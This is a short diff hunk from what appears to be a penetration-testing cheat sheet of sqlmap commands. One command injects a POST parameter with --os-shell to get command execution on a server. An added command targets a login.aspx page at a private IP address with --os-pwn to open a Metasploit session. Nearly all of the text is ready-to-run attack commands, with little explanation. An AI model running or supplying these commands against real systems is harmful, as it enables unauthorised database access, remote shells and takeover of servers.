@@ -106,3 +106,6 @@ $ Using POST with session cookie and body data, -D set DataBase and T set Table
 
 sqlmap -v -u http://$target/class.php --data 'weight=100&height=190&age=34&gender=Male&email=asdf%40asdf.com' --random-agent -p height --os-shell
 $ Get exec on server
+
+# Start MSFConsole with the server:
+sqlmap -u http://192.168.216.121/login.aspx --random-agent --data='Username=usuario&4PasswordT=&LoginButton=Login' -p Username --os-pwn
